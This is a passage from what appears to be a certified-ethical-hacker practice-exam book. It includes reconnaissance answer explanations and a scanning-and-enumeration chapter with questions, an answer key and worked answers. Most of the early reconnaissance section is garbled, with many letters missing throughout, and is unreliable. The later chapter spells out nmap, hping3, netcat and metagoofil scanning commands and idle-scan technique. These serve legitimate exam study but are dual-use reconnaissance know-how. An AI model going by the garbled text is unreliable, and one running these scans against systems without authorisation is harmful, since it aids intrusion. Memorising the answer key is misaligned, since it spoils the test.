of Bigfoo i h woods. Th picu islf would b h focus of vyo lookig
a i, bu h fil holds all sos of oh ifo oo—lik poially where you w
wh you ook i ad what time of day i was. Magoofil ls you pull ifomaio
lik his off of all sos of daa fils, which ca b hlpful i puig ogh a social
giig pla (amog oh higs).

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

51

02-ch02.indd 51 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

☐✗ B is icoc bcaus Shoda is’ a ool you’d cssaily us o fid madaa.
I’s a sach gi you’d us o fid, wll, viually vyhig ls. Shoda idxs
ayhig ha’s cocd o h I ha i ca fid—vyhig fom svs
ad wbcams o I-cocd figaos ad oils.

☐✗ C is icoc bcaus whois is usd o fid ou ifomaio o a gisd domai,
icludig who ows i ad how o g i coac wih hm.

☐✗ D is icoc bcaus Malgo is a op souc illigc (OSINT) ad fosics
applicaio ha agggas vaious OSINT daabass.

21. A zo fil cosiss of which cods? (Choos all ha apply.)

A. PTR

B. MX

C. SN

D. SOA

E. DNS

F. A

G. AX

☑ A, B, D, F. A zo fil coais a lis of all h souc cods i h amspac
zo. Valid souc cods a as follows:

SRV Service This record defines the hostname and port number of servers providing
specific services, such as a Directory Services server.

SOA Start of Authority This record identifies the primary name server for the zone. The
SOA record contains the hostname of the server responsible for all DNS records within
the namespace as well as the basic properties of the domain.

PTR Pointer This record maps an IP address to a hostname (providing for reverse
DNS lookups). You don’t absolutely need a PTR record for every entry in your DNS
namespace, but PTR records are usually associated with e-mail server records.

NS Name Server This record defines the name servers within your namespace. These
servers are the ones that respond to your client’s requests for name resolution.

MX Mail Exchange This record identifies your e-mail servers within your domain.

CNAME Canonical Name This record provides for domain name aliases within your zone.
For example, you may have an FTP server and a web service running on the same IP
address. CNAME records could be used to list both within DNS for you.

A Address This record maps an IP address to a hostname and is used most often for
DNS lookups.

☐✗ C, E, ad G a icoc bcaus hy a o valid DNS souc cods.

CEH Certified Ethical Hacker Practice Exams

52

02-ch02.indd 52 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

22. Wihi h OSRFamwok, which ool vifis if a usam/pofil xiss i up o 306
diff plafoms?

A. domaify.py

B. mailfy.py

C. sachfy.py

D. usufy.py

☑ D. Th OSRFamwok (hps://gihub.com/i3visio/osfamwok) is a op
souc sach famwok i Pyho ha hlps you i h ask of us pofilig by
makig us of diff OSINT ools. Th famwok dsig islf is miisc of
h Masploi famwok. I also has a wb-basd GUI ha dos h wok fo you if
you lik o wok wihou h commad li. I oh wods, i’s a s of libais usd
o pfom OSINT asks, hlpig you gah mo, ad mo accua, daa usig
mulipl applicaios i o asy-o-us packag. Usufy.py is bu o of h ools
i h famwok, ad i vifis if a usam/pofil xiss i up o 306 diff
plafoms.

☐✗ A is icoc bcaus his ool vifis h xisc of a giv domai (p h si,
i up o 1567 diff gisis).

☐✗ B is icoc bcaus his ool chcks if a usam (-mail) has b gisd i
e-mail povids.

☐✗ C is icoc bcaus his ool looks fo profiles usig full names and other info
i up o sv plafoms. As a asid, ECC occasioally gs vy spcific i
hi qusioig, ad hy wod his diffly by sayig h ool quis h
OSRFamwok plafom islf.

23. A collagu s h followig io a Googl sach sig:
intitle:intranet inurl:intranet intext:"finance"

Which of h followig sams is mos coc cocig his amp?

A. Th sach gi will o spod wih ay sul bcaus you cao combi
Googl hacks i o li.

B. Th sach gi will spod wih all pags havig h wod intranet i hi il
ad finance i h URL.

C. Th sach gi will spod wih all pags havig h wod intranet i h il
ad i h URL.

D. Th sach gi will spod wih oly hos pags havig h wod intranet i h
il ad URL ad wih finance i h x.

☑ D. This is a ga Googl hack ha’s lisd o sval wbsis povidig Googl
hackig xampls. Thik abou wha you’ lookig fo h—a ial pag
(intranet i h il ad URL) possibly coaiig fiac daa. Do’ you hik ha
would b valuabl? This xampl shows h bauy of combiig Googl hacks o

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

53

02-ch02.indd 53 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

ally buow dow o wha you wa o gab. Gad, a ia big availabl
fom h I, idxd by Googl, ad op ough fo you o ouch i is ulikly,
bu hs a qusios cocig syax, o aliy.

☐✗ A is icoc bcaus Googl hack opaos can b combid. I fac, oc you g
usd o hm, you’ll spd mo im combiig hm o aow h focus of a aack
ha lauchig hm o by o.

☐✗ B is icoc bcaus h opao dos o say o look fo finance i h URL.
I spcifically sas ha should b lookd fo i h x of h pag.

☐✗ C is icoc bcaus h is mo o h opaio sig ha jus intranet i h
URL ad il. Do’ jus skim ov h intext:"finance" opao—i maks asw D
mo coc.

24. Amada woks as sio scuiy aalys ad ovhas a collagu discussig how h
compay usd o iadvly so popiay ifomaio o hi mai wbsi, bu
sic hy alizd i ad ook i dow back a ya ago, i’s o log a ha o hi
busiss. Wh qusiod o i, h claims sval mohs ago h id adom URLs o
h compay’s wbsi ad foud cofidial ifomaio. Amada visis h sam URLs
bu fids ohig. Wh ca Amada go o s pas vsios ad pags of a wbsi?

A. Sach.com

B. Googl cach

C. Pashash.com

D. Achiv.og

☑ D. Th I Achiv (hp://achiv.og) is a opofi ogaizaio “ddicad
o build a I libay. Is puposs iclud offig pma accss fo
sachs, hisoias, scholas, popl wih disabiliis, ad h gal public o
hisoical collcios ha xis i digial foma.” Th good-old Wayback Machi
has b usd fo a log im o pull up old copis of wbsis, fo good ad mayb
o-so-good puposs. Achiv.og icluds “sapshos of h Wold Wid Wb,”
which a achivd copis of pags ak a vaious pois i im daig back o
1996. As a addiioal o, Achiv.og is oly goig o pull ad so pags ha
w likd, shad, o commoly availabl, so do’ assum vy pag v pu up
by ayo aywh will always b availabl.

☐✗ A is icoc bcaus Sach.com is simply aoh sach gi a you disposal.
I dos o hold achivd copis.

☐✗ B is icoc bcaus Googl cach holds a copy of h si oly fom h las
“cawl”—usually ohig old ha a coupl o a fw days.

☐✗ C is icoc bcaus, as fa as I kow, Pashash.com dos’ v xis.

CEH Certified Ethical Hacker Practice Exams

54

02-ch02.indd 54 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

25. Which of h followig is a pimay svic of h U.S. Compu Scuiy Icid
Rspos Tam (CSIRT)?

A. CSIRT povids a icid spos svic o abl a liabl ad usd sigl
poi of coac fo poig compu scuiy icids woldwid.

B. CSIRT povids a compu scuiy suvillac svic o supply h govm
wih impoa illigc ifomaio o idividuals avlig aboad.

C. CSIRT povids a paio sig svic o suppo xcpio poig o
icids woldwid by idividuals ad muliaioal copoaios.

D. CSIRT povids a vulabiliy assssm svic o assis law focm agcis
wih pofilig a idividual’s popy o compay’s ass.

☑ A. EC-Coucil loves CSIRT, ad I pomis you’ll s i miod somwh o
h xam. P is wbsi (www.csi.og/), h Compu Scuiy Icid Rspos
Tam (CSIRT) “povids 24x7 Compu Scuiy Icid Rspos Svics o ay
us, compay, govm agcy o ogaizaio. CSIRT povids a liabl ad
usd sigl poi of coac fo poig compu scuiy icids woldwid.
CSIRT povids h mas fo poig icids ad fo dissmiaig impoa
icid-lad ifomaio.” A pivaly hld compay ha sad i 2001, CSIRT
sks “o ais awass amog is cusoms of compu scuiy issus, ad
povids ifomaio fo scu pocio of ciical compuig ifasucu ad
quipm agais poial ogaizd compu aacks.”

☐✗ B, C, ad D a icoc bcaus hs sams do o mach CSIRT’s pupos
o acios.

26. You cli’s busiss is hadquad i Japa. Which gioal gisy would b h
bs plac o look fo foopiig ifomaio?

A. APNIC

B. RIPE

C. ASIANIC

D. ARIN

E. LACNIC

☑ A. This o is asy as pi ad should b a fbi if you s i o h s. Th a fiv
gioal I gisis ha povid ovall maagm of h public IP addss
spac wihi a giv gogaphic gio. APNIC hadls h Asia ad Pacific alms.

☐✗ B is icoc bcaus RIPE hadls Euop, Middl Eas, ad pas of Cal Asia/
Noh Afica. If you’ wodig, h am is Fch ad sads fo Résaux IP
Euopés.

☐✗ C is icoc bcaus ASIANIC is o a gioal gisy. I’s puly a disaco h.

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

55

02-ch02.indd 55 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

☐✗ D is icoc bcaus h ARIN svic gio icluds Caada, may Caibba
ad Noh Alaic islads, ad h Uid Sas. Caibba islads fallig ud
ARIN iclud Puo Rico, h Bahamas, Aigua, Amica ad Biish Vigi
Islads, Tuks ad Caicos Islads, ad h Cayma Islads (amog ohs).

☐✗ E is icoc bcaus LACNIC hadls Lai Amica ad pas of h Caibba.
I sads fo Lai Amica ad Caibba Nwok Ifomaio C. LACNIC
covag icluds mos of Souh Amica, Guamala, Fch Guiaa, Domiica
Rpublic, ad Cuba (amog ohs). Exam aks mos of g his o ad ARIN
cofusd.

CEH Certified Ethical Hacker Practice Exams

56

02-ch02.indd 56 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

CHAPTER

Scanning and Enumeration 3
This chapter includes questions from the following topics:

• Understand EC-Council’s scanning methodology
• Describe scan types and the objectives of scanning
• Understand the use of various scanning and enumeration tools
• Describe TCP communication (three-way handshake and flag types)
• Understand basic subnetting
• Understand enumeration and enumeration techniques
• Describe vulnerability scanning concepts and actions
• Describe the steps involved in performing enumeration

I love fishing. Scratch that—a better statement is that I am addicted to fishing. I dream about it.
I think about it during my workday, I plan my weekends around it—heck, I even decorated my
office with fishing paraphernalia, and occasionally catch myself staring at that sea trout picture
over there to my left and sighing mournfully. And, on days like today when the ponds behind my
house look like a mirror that God is using to comb his hair in as He looks down from above, it’s all
I can do not to grab the rods and race out of the house. Instead, I’m sitting here in my little home
office dedicating my morning to you and your needs, dear reader. You’re welcome.

All fishing is good, and I’ve tried most of it. I’m not really wild about catching fish with my
hands (those noodling guys don’t have all the cheese on their crackers), and ice fishing isn’t a
favorite of mine because I hate the cold—not to mention it just seems so dang boring, sitting
there looking at a little hole and hoping you’ve drilled in just the right spot—but I love kayak
fishing. Don’t get me wrong—I still really enjoy going out on a deep-sea boat or riding along
in someone’s bass boat, flying across the top of the water, but being in a kayak just seems more
personal. Sitting right on top of the water, sneaking up to fish, and watching them eat the bait is
just short of a religious experience, and it cannot be beat.

Now you can certainly catch fish just by paddling around and casting blindly all around you.
But if you want to catch good fish and catch them with more regularity, you have to learn how
to read the water, and since I can’t take you all there and paddle around to give a hands-on
lesson, we’ll have to run a little thought experiment instead. Sit back in our little virtual kayak,
and we’ll paddle around to see what we can find. Look around in your mind’s eye with me and
scan the water around us. See that little ripple over there? Those are mullet swimming around in
lazy circles. Nothing is after them, or they’d be darting and running into the shallows, so there’s

57

03-ch03.indd 57 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

no point in paddling that way yet. That heavy wake over there that kind of looks like a small
submarine underwater? That’s a redfish, and he’s definitely after something; we’ll absolutely take a
shot his way. And those things that look like tiny brooms poking out of the water over there? Yeah,
that’s a bunch of redfish, nosed down into the muck eating crabs or shrimp. If we watch the school
for a bit, it’ll make it easier to map out an approach and figure out the best casting opportunities
without spooking them.

Much like the signs we can see by scanning the surface of the water on the flats, your scanning
and enumeration efforts in the virtual world will point you in the right direction and, once
you get some experience with what you’re looking at, will improve your hook-up percentage. As
detailed in CEH Certified Ethical Hacker All-in-One Exam Guide, Fifth Edition, the companion
book to this study guide, now that you know how to footprint your client, it’s time to learn how
to dig around what you’ve found for relevant, salient information. After footprinting, you’ll need
to scan for basics; then, when you find a machine up and about, you’ll need to get to know it really
well, asking some rather personal questions.

STUDY TIPS First and foremost, get your general network knowledge down
pat. Know your port numbers, protocols, and communications handshakes
like the back of your hand. While you’re at it, take some time to think about
and write down all the steps you can think of that occur when one system

wishes to communicate with another. Knowing how the process starts—where the
system looks first for name resolution, which protocols find the MAC and IP addresses
you’ll need, what transport protocols are used and why—will not only help you on this
exam, but it’ll make you a better pen tester.

Learn how routing/switching basics can affect your efforts: for example, you
should know that a routing protocol (such as OSPF or BGP) determines how routers
communicate with each other and make decisions on moving packets and that routed
protocols (such as IP) are the ones that provide network layer addressing. Although there
won’t be a ton of them, questions on subnetting will make an appearance, so know your
math well.

When it comes to scanning, know your scanning tools very well. EC-Council absolutely
adores nmap, so know syntax, responses, results, switches… all of it. You’ll be quizzed on
use, output, syntax, and lots of scanning tools, so prep by practicing—it’s the absolute
best way to prepare for this exam.

Lastly, Windows and Linux architecture basics aren’t going to make up the majority of
your exam, but rest assured you will be tested on them—especially on anything that’s
different between the two. For example, some tools will work with and on Windows,
but not on Linux, and vice versa. Each architecture has built-in tools and services (for
example, know net command usage in Windows very well) that may work differently on
the other architecture, so be sure to focus on those for study.

CEH Certified Ethical Hacker Practice Exams

58

03-ch03.indd 58 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

QUESTIONS

1. Your team is hired to test a business named Matt’s Bait ’n’ Tackle Shop (domain name Q
mattsBTshop.com). A team member runs the following command:
metagoofil -d mattsBTshop.com -t doc,docx -l 50 -n 20 -f results.html

Which of the following best describes what the team member is attempting to do?

A. Extracting metadata info from web pages in mattsBTshop.com, outputting results in
Microsoft Word format

B. Extracting metadata info from the results.html page in mattsBTshop.com, outputting
results in Microsoft Word format

C. Extracting metadata info from Microsoft Word documents found in mattsBTshop.com,
outputting results in an HTML file

D. Uploading results.html as a macro attachment to any Microsoft Word documents
found in mattsBTshop.com

2. You are running multiple enumeration scans as part of an assessment. In one particular
scan, you have nmap send an initial FIN packet followed immediately by an ACK packet.
Which of the following best describes the type of scan you are running?

A. Inverse TCP

B. TCP Maimon

C. XMAS

D. Half-closed

3. You have a zombie system ready and begin an IDLE scan. As the scan moves along,
you notice that fragment identification numbers gleaned from the zombie machine are
incrementing randomly. What does this mean?

A. Your IDLE scan results will not be useful to you.

B. The zombie system is a honeypot.

C. There is a misbehaving firewall between you and the zombie machine.

D. This is an expected result during an IDLE scan.

4. You want to perform a ping sweep of a subnet within your target organization. Which of
the following nmap command lines is your best option?

A. nmap 192.168.1.0/24

B. nmap -sT 192.168.1.0/24

C. nmap -sP 192.168.1.0/24

D. nmap -P0 192.168.1.0/24

Chapter 3: Scanning and Enumeration

59

03-ch03.indd 59 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

5. A pen tester is performing banner grabbing and executes the following command:
$ nmap -sV host.domain.com -p 80

He gets the following output:
Starting Nmap 6.47 ( http://nmap.org ) at 2022-07-08 19:10 EST
Nmap scan report for host.domain.com (108.61.158.211)
Host is up (0.032s latency).
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd
Service detection performed. Please report any incorrect results at
http://nmap.org/submit/.
VCEConvert.com
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds

Which of the following is a true statement?

A. Nmap can’t perform banner grabbing, as it cannot retrieve the version number of any
running remote service.

B. The pen tester was successful in banner grabbing.

C. Using nmap -O host.domain.com would have been a better choice for banner grabbing.

D. Banner grabbing failed because the result did not return the version of the Apache
web server.

6. You are examining traffic to see if there are any network-enabled printers on the subnet.
Which of the following ports should you be monitoring for?

A. 53

B. 88

C. 445

D. 514

E. 631

7. A colleague enters the following command:
root@mybox: # hping3 -A 192.168.2.x -p 80

What is being attempted here?

A. An ACK scan using hping3 on port 80 for a single address

B. An ACK scan using hping3 on port 80 for a group of addresses

C. Address validation using hping3 on port 80 for a single address

D. Address validation using hping3 on port 80 for a group of addresses

8. You are examining traffic between hosts and note the following exchange:
Source Prot Port Flag Destination
192.168.5.12 TCP 4082 FIN/URG/PSH 192.168.5.50
192.168.5.12 TCP 4083 FIN/URG/PSH 192.168.5.50
192.168.5.12 TCP 4084 FIN/URG/PSH 192.168.5.50
192.168.5.50 TCP 4083 RST/ACK 192.168.5.12
192.168.5.12 TCP 4085 FIN/URG/PSH 192.168.5.50

CEH Certified Ethical Hacker Practice Exams

60

03-ch03.indd 60 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

Which of the following statements are true regarding this traffic? (Choose all that apply.)

A. It appears to be part of an ACK scan.

B. It appears to be part of an XMAS scan.

C. It appears port 4083 is open.

D. It appears port 4083 is closed.

9. You are examining traffic and notice an ICMP Type 3, Code 13 response. What does this
normally indicate?

A. The network is unreachable.

B. The host is unknown.

C. Congestion control is enacted for traffic to this host.

D. A firewall is prohibiting connection.

10. Which port-scanning method presents the most risk of discovery but provides the most
reliable results?

A. Full-connect

B. Half-open

C. Null scan

D. XMAS scan

11. As a pen test on a major international business moves along, a colleague discovers an
IIS server and a mail exchange server on a DMZ subnet. You review a ping sweep
accomplished earlier in the day on that subnet and note neither machine responded to
the ping. What is the most likely reason for the lack of response?

A. The hosts might be turned off or disconnected.

B. ICMP is being filtered.

C. The destination network might be down.

D. The servers are Linux based and do not respond to ping requests.

12. A team member is using nmap and asks about the “scripting engine” in the tool. Which
option switches can be used to invoke the nmap scripting engine? (Choose two.)

A. --script

B. -z

C. -sA

D. -sC

Chapter 3: Scanning and Enumeration

61

03-ch03.indd 61 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

13. Which of the following commands is the best choice to use on a Linux machine when
attempting to list processes and the UIDs associated with them in a reliable manner?

A. ls

B. chmod

C. pwd

D. lsof

14. You want to display active and inactive services on a Windows Server machine. Which of
the following commands best performs this service?

A. sc query

B. sc query type=all

C. sc query type=service

D. sc query state= all

15. An administrator enters the following command on a Linux system:
iptables -t nat -L

Which of the following best describes the intent of the command entered?

A. The administrator is attempting a port scan.

B. The administrator is configuring IP masquerading.

C. The administrator is preparing to flood a switch.

D. The administrator is preparing a DoS attack.

16. What is being attempted with the following command?
nc -u -v -w2 192.168.1.100 1-1024

A. A full-connect scan on ports 1–1024 for a single address

B. A full-connect scan on ports 1–1024 for a subnet

C. A UDP scan of ports 1–1024 on a single address

D. A UDP scan of ports 1–1024 on a subnet

17. You are told to monitor a packet capture for any attempted DNS zone transfer. Which
port should you focus your search on?

A. TCP 22

B. TCP 53

C. UDP 22

D. UDP 53

CEH Certified Ethical Hacker Practice Exams

62

03-ch03.indd 62 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

18. A team member issues the nbtstat.exe -c command. Which of the following best
represents the intent of the command?

A. It displays the IP route table for the machine.

B. It displays the NetBIOS name cache.

C. It displays active and inactive services.

D. It puts a NIC into promiscuous mode for sniffing.

19. Consider the ports shown in the nmap output returned on an IP scanned during
footprinting:
PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http
139/tcp open netbios-ssn 515/tcp open 631/tcp open ipp 9100/tcp
open MAC Address: 01:2A:48:0B:AA:81

Which of the following is true regarding the output?

A. The host is most likely a router or has routing enabled.

B. The host is most likely a printer or has a printer installed.

C. The host is definitely a Windows server.

D. The host is definitely a Linux server.

20. The following results are from an nmap scan:
Starting nmap V. 3.10A ( www.insecure.org/nmap/
<http://www.insecure.org/nmap/> )
Interesting ports on 192.168.15.12:
(The 1592 ports scanned but not shown below are in state: filtered)
Port State Service
21/tcp open ftp
25/tcp open smtp
53/tcp closed domain
80/tcp open http
443/tcp open https
Remote operating system guess: Too many signatures match to

reliably guess the OS.
Nmap run completed -- 1 IP address (1 host up) scanned in 263.47 seconds

Which of the following is the best option to assist in identifying the operating system?

A. Attempt an ACK scan.

B. Traceroute to the system.

C. Run the same nmap scan with the -vv option.

D. Attempt banner grabbing.

Chapter 3: Scanning and Enumeration

63

03-ch03.indd 63 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

21. You want to run a scan against a target network. You’re concerned about it being a reliable
scan, with legitimate results, but want to take steps to ensure it is as stealthy as possible.
Which scan type is best in this situation?

A. nmap -sN targetIPaddress

B. nmap -sO targetIPaddress

C. nmap -sS targetIPaddress

D. nmap -sT targetIPaddress

22. What is the second step in the TCP three-way handshake?

A. SYN

B. ACK

C. SYN/ACK

D. ACK-SYN

E. FIN

23. In which scanning method would an attacker send INIT chunks to targets and await
responses?

A. SCTP INIT scan

B. SCTP COOKIE ECHO scan

C. SCTP half-open scan

D. SCTP full-connect scan

24. Nmap is a powerful scanning and enumeration tool. What does the following nmap
command attempt to accomplish?
nmap -sA -T4 192.168.15.0/24

A. A serial, slow operating system discovery scan of a Class C subnet

B. A parallel, fast operating system discovery scan of a Class C subnet

C. A serial, slow ACK scan of a Class C subnet

D. A parallel, fast ACK scan of a Class C subnet

25. You are examining a packet capture of all traffic from a host on the subnet. The host sends
a segment with the SYN flag set in order to set up a TCP communications channel. The
destination port is 80, and the sequence number is set to 10. Which of the following
statements are not true regarding this communications channel? (Choose all that apply.)

A. The host will be attempting to retrieve an HTML file.

B. The source port field on this packet can be any number between 1024 and 65535.

C. The first packet from the destination in response to this host will have the SYN and
ACK flags set.

D. The packet returned in answer to this SYN request will acknowledge the sequence
number by returning 10.

CEH Certified Ethical Hacker Practice Exams

64

03-ch03.indd 64 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

26. Which TCP flag instructs the recipient to ignore buffering constraints and immediately
send all data?

A. URG

B. PSH

C. RST

D. BUF

27. You receive a RST-ACK from a port during a SYN scan. What is the state of the port?

A. Open

B. Closed

C. Filtered

D. Unknown

28. A penetration tester is examining the following NMAP result:
Starting NMAP 5.21 at 2022-07-08 11:06 NMAP scan report for 172.16.40.65
Host is up (1.00s latency). Not shown: 993 closed ports
PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http
139/tcp
open netbios-ssn 515/tcp open 631/tcp open ipp 9100/tcp
open MAC Address: 00:00:48:0D:EE:8

Which of the following is a true statement?

A. The host is likely a printer.

B. The host is likely a Windows machine.

C. The host is likely a Linux machine.

D. The host is likely a router.

Chapter 3: Scanning and Enumeration

65

03-ch03.indd 65 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

QUICK ANSWER KEY

1. C 11. B 21. C

2. B 12. A, D 22. C

3. A 13. D 23. A

4. C 14. D 24. D

5. B 15. B 25. A, D

6. E 16. C 26. B

7. B 17. B 27. B

8. B, D 18. B 28. A

9. D 19. B

10. A 20. D

CEH Certified Ethical Hacker Practice Exams

66

03-ch03.indd 66 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

ANSWERS

1. Your team is hired to test a business named Matt’s Bait ’n’ Tackle Shop (domain name A
mattsBTshop.com). A team member runs the following command:
metagoofil -d mattsBTshop.com -t doc,docx -l 50 -n 20 -f results.html

Which of the following best describes what the team member is attempting to do?

A. Extracting metadata info from web pages in mattsBTshop.com, outputting results in
Microsoft Word format

B. Extracting metadata info from the results.html page in mattsBTshop.com, outputting
results in Microsoft Word format

C. Extracting metadata info from Microsoft Word documents found in mattsBTshop.com,
outputting results in an HTML file

D. Uploading results.html as a macro attachment to any Microsoft Word documents
found in mattsBTshop.com

☑ C. This is an example of good tool knowledge and use. Metagoofil, per www
.edge-security.com/metagoofil.php, “is an information gathering tool designed
for extracting metadata of public documents (.pdf, .doc, .xls, .ppt, .docx, .pptx,
.xlsx) belonging to a target company. It performs a search in Google to identify
and download the documents to local disk and then will extract the metadata with
different libraries like Hachoir, PdfMiner and others. With the results it will generate
a report with usernames, software versions and servers or machine names that will
help Penetration testers in the information gathering phase.”

In the syntax given, Metagoofil will search mattsBTshop.com for up to 50 results
(the -l switch determines the number of results) for any Microsoft Word documents
(both .doc and .docx formats) it can find. It will then attempt to download the first
20 found (the -n switch handles that), and the -f switch will send the results where
you want (in this case, to an HTML file).

And just what will those results be? Well, that’s where the fun comes in. Remember,
Metagoofil tries to extract metadata from publicly available Microsoft Word documents
available on the site. You might find e-mail addresses, document paths, software
versions, and even usernames in the results.

☐✗ A, B, and D are incorrect because they do not match the syntax provided.

2. You are running multiple enumeration scans as part of an assessment. In one particular
scan, you have nmap send an initial FIN packet followed immediately by an ACK packet.
Which of the following best describes the type of scan you are running?

A. Inverse TCP

B. TCP Maimon

C. XMAS

D. Half-closed

Chapter 3: Scanning and Enumeration

67

03-ch03.indd 67 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☑ B. According to nmap’s documentation on the scan (https://nmap.org/book/scan-
methods-maimon-scan.html), way back in 1996 a gentleman named Uriel Maimon
wrote an article titled “Port Scanning without the SYN flag.” The article described
sending an initial FIN packet followed by an ACK packet, using discrepancies
between their TTL values to evaluate ports.

EC-Council added TCP Maimon back to the official courseware and obviously wants
you to know about it. Per the study material, if the port is open, you won’t get a
response; however, if it’s in a closed state, you’ll receive a RST packet.

☐✗ A is incorrect because an Inverse TCP Flag scan is one in which TCP probe flags are
sent with or without flags. No response indicates an open port, whereas a RST is sent
on a closed one. Flags typically used in this scan include FIN, URG, and PSH. As an
aside, if no flags are used, this can also be referred to as a null scan.

☐✗ C is incorrect because an XMAS scan is one where all TCP flags (FIN, URG, PSH)
are turned on. This scan is ineffective against Windows systems and only works on
devices that use an RFC-793-based TCP stack.

☐✗ D is incorrect because this scan type simply doesn’t exist.

3. You have a zombie system ready and begin an IDLE scan. As the scan moves along,
you notice that fragment identification numbers gleaned from the zombie machine are
incrementing randomly. What does this mean?

A. Your IDLE scan results will not be useful to you.

B. The zombie system is a honeypot.

C. There is a misbehaving firewall between you and the zombie machine.

D. This is an expected result during an IDLE scan.

☑ A. An IDLE scan makes use of a zombie machine and IP’s knack for incrementing
fragment identifiers (IPIDs). However, it is absolutely essential the zombie remain
idle to all other traffic during the scan. The attacker will send packets to the target
with the (spoofed) source address of the zombie. If the port is open, the target will
respond to the SYN packet with a SYN/ACK, but this will be sent to the zombie. The
zombie system will then craft a RST packet in answer to the unsolicited SYN/ACK,
and the IPID will increase. If this occurs randomly, then it’s probable your zombie is
not in fact idle, and your results are moot. See, if it’s not idle, it’s going to increment
haphazardly because communications from the device will be shooting hither and
yon with wild abandon. You’re banking on the fact the machine is quietly doing your
bidding—and nothing else.

☐✗ B is incorrect because there is not enough information here to identify the zombie
machine as anything at all—much less a machine set up as a “honeypot.”

☐✗ C is incorrect because a firewall between you and the zombie won’t have any effect at
all on the zombie’s IPIDs.

CEH Certified Ethical Hacker Practice Exams

68

03-ch03.indd 68 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

☐✗ D is incorrect because this is definitely not expected behavior during an IDLE scan.
Expected behavior is for the IPID to increase regularly with each discovered open
port, not randomly, as occurs with traffic on an active system.

4. You want to perform a ping sweep of a subnet within your target organization. Which of
the following nmap command lines is your best option?

A. nmap 192.168.1.0/24

B. nmap -sT 192.168.1.0/24

C. nmap -sP 192.168.1.0/24

D. nmap -P0 192.168.1.0/24

☑ C. The -sP switch within nmap is designed for a ping sweep. Nmap syntax is fairly
straightforward: nmap<scan options><target>. If you don’t define a switch, nmap
performs a basic enumeration scan of the targets. The switches, though, provide the
real power with this tool.

☐✗ A is incorrect because this syntax will not perform a ping sweep. This syntax will run
a basic scan against the entire subnet.

☐✗ B is incorrect because the -sT switch does not run a ping sweep. It stands for a TCP
Connect scan, which is the slowest—but most productive and loud—scan option.

☐✗ D is incorrect because this syntax will not perform a ping sweep. The -P0 switch
actually runs the scan without ping (ICMP). This is a good switch to use when you
don’t seem to be getting responses from your targets. It forces nmap to start the scan
even if it thinks the target doesn’t exist (which is useful if the computer is blocked by
a firewall).

5. A pen tester is performing banner grabbing and executes the following command:
$ nmap -sV host.domain.com -p 80

He gets the following output:
Starting Nmap 6.47 ( http://nmap.org ) at 2022-07-08 19:10 EST
Nmap scan report for host.domain.com (108.61.158.211)
Host is up (0.032s latency).
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd
Service detection performed. Please report any incorrect results at
http://nmap.org/submit/.
VCEConvert.com
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds

Which of the following is a true statement?

A. Nmap can’t perform banner grabbing, as it cannot retrieve the version number of any
running remote service.

B. The pen tester was successful in banner grabbing.

C. Using nmap -O host.domain.com would have been a better choice for banner grabbing.

Chapter 3: Scanning and Enumeration

69

03-ch03.indd 69 08/04/22 10:44 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 3

D. Banner grabbing failed because the result did not return the version of the Apache
web server.

☑ B. You can expect a few versions of this type of question on your exam. Not only are
there bunches of ways to do banner grabbing, but the outputs of each method are
different. In this case, the nmap attempt was successful in identifying an Apache server.

☐✗ A is incorrect because nmap can most certainly perform banner grabbing.

☐✗ C is incorrect because the -O flag enables OS detection.

☐✗ D is incorrect because the lack of a version number is irrelevant (oftentimes Apache
boxes won’t respond with a version number, even when the banner grab is correctly
accomplished).

6. You are examining traffic to see if there are any network-enabled printers on the subnet.
Which of the following ports should you be monitoring for?

A. 53

B. 88

C. 445

D. 514

E. 631

